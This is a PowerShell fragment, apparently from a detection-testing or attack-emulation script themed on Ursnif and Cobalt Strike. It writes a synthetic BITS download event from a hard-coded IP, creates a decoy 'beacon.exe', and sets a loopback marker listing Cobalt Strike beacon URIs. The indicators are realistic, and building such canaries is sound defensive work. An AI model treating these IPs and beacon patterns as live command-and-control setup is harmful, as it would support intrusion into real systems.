Write-UrsnifGiftFile(Join-Path $p.Logs 'BITS-Client-Operational.jsonl')(@{event='BITS transfer';source='http://193.201.9.199:80/a';destination='%TEMP%\random';jobCreated=$false;bytesTransferred=0;synthetic=$true}|ConvertTo-Json -Compress)'BITS event canary'
$beacon=Join-Path $p.Payloads 'beacon.exe';New-UrsnifGiftDecoy $beacon 'Cobalt Strike HTTPS beacon stand-in';Invoke-UrsnifGiftDecoy $beacon 'Cobalt Strike HTTPS beacon GET /__utm.gif POST /submit.php sleep 60000' 'powershell.exe';Invoke-UrsnifGiftLoopback 443 '193.201.9.199:443 Cobalt Strike' 'HTTPS marker'
